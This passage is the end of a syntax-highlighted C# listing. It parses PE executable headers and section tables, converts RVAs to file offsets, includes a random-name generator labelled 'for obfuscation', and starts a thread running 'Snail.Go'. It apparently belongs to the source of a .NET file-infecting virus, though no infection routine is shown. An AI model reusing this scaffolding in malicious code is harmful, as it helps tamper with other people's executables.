                </span><span class="sc11">sections</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">ticks</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadInt32</span><span class="sc10">()!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">(</span><span class="sc6">"Symbol table offset != 0"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadInt32</span><span class="sc10">()!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">(</span><span class="sc6">"Symbol table count != 0"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">optHeaderSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">characteristics</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">magic</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">magic</span><span class="sc10">!=</span><span class="sc4">0x10B</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">(</span><span class="sc6">"Bad magic number for PE Optional Header"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">lMajor</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadByte</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">lMinor</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadByte</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lMajor</span><span class="sc10">!=</span><span class="sc4">6</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">lMinor</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">(</span><span class="sc6">"Bad L number"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">codeSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">IDSSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">UDSSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">entryPointRVA</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">baseOfCodeRVA</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">baseOfDataRVA</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">imageBase</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">sectionAlignment</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">fileAlignment</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">osMajor</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">osMinor</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">userMajor</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">userMinor</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">subsysMajor</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">subsysMinor</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">imageSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">headerSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">chkSum</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">   
                </span><span class="sc11">subSystem</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">dllFlags</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt16</span><span class="sc10">();</span><span class="sc0">       
                </span><span class="sc11">stackReserveSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">stackCommitSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">heapReserveSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">heapCommitSize</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">loaderFlags</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">dataDictionaryCount</span><span class="sc10">=</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc11">exportTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">importTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">resourceTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">exceptionTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">certificateTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">baseRelocationTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">debugTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">copyrightTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">globalPtrTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">tlsTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">loadConfigTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">boundImportTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">iatTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">delayImportDescriptorTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">cliHeaderTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">reservedTable</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Dictionary</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">(),</span><span class="sc11">source</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc11">sectionHeaders</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">I</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">I</span><span class="sc10">&lt;</span><span class="sc11">sections</span><span class="sc10">;</span><span class="sc11">I</span><span class="sc10">++)</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">sectionHeaders</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SectionHeader</span><span class="sc10">());</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">SectionHeader</span><span class="sc10">)</span><span class="sc11">sectionHeaders</span><span class="sc10">[</span><span class="sc11">I</span><span class="sc10">]).</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">OffsetFromRVA</span><span class="sc10">(</span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">I</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">I</span><span class="sc10">&lt;</span><span class="sc11">sectionHeaders</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">;</span><span class="sc11">I</span><span class="sc10">++)</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(((</span><span class="sc11">SectionHeader</span><span class="sc10">)</span><span class="sc11">sectionHeaders</span><span class="sc10">[</span><span class="sc11">I</span><span class="sc10">]).</span><span class="sc11">virtualAddress</span><span class="sc10">&lt;=</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">&lt;((</span><span class="sc11">SectionHeader</span><span class="sc10">)</span><span class="sc11">sectionHeaders</span><span class="sc10">[</span><span class="sc11">I</span><span class="sc10">]).</span><span class="sc11">virtualAddress</span><span class="sc10">+((</span><span class="sc11">SectionHeader</span><span class="sc10">)</span><span class="sc11">sectionHeaders</span><span class="sc10">[</span><span class="sc11">I</span><span class="sc10">]).</span><span class="sc11">virtualSize</span><span class="sc10">)</span><span class="sc0"> 
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">SectionHeader</span><span class="sc10">)</span><span class="sc11">sectionHeaders</span><span class="sc10">[</span><span class="sc11">I</span><span class="sc10">]).</span><span class="sc11">pointerToRawData</span><span class="sc10">+(</span><span class="sc11">rva</span><span class="sc10">-((</span><span class="sc11">SectionHeader</span><span class="sc10">)</span><span class="sc11">sectionHeaders</span><span class="sc10">[</span><span class="sc11">I</span><span class="sc10">]).</span><span class="sc11">virtualAddress</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">(</span><span class="sc6">"Unresolvable RVA "</span><span class="sc10">+</span><span class="sc11">rva</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// random strings generator (for obfuscation)
</span><span class="sc0">        </span><span class="sc2">//   
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">RandomStrings</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">minlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">maxlen</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">RandomStrings</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">seed</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">rand</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc11">seed</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">minlen</span><span class="sc10">=</span><span class="sc11">len1</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">maxlen</span><span class="sc10">=</span><span class="sc11">len2</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Next</span><span class="sc10">()</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">=</span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc11">minlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">maxlen</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">8</span><span class="sc10">)==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">str</span><span class="sc10">+=(</span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc4">0x41</span><span class="sc10">+</span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">26</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0">
                        </span><span class="sc11">str</span><span class="sc10">+=(</span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc4">0x61</span><span class="sc10">+</span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">26</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">MainClass</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">(</span><span class="sc11">String</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">args</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Thread</span><span class="sc0"> </span><span class="sc11">thr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Thread</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ThreadStart</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">.</span><span class="sc11">Go</span><span class="sc10">));</span><span class="sc0">            
            </span><span class="sc11">thr</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
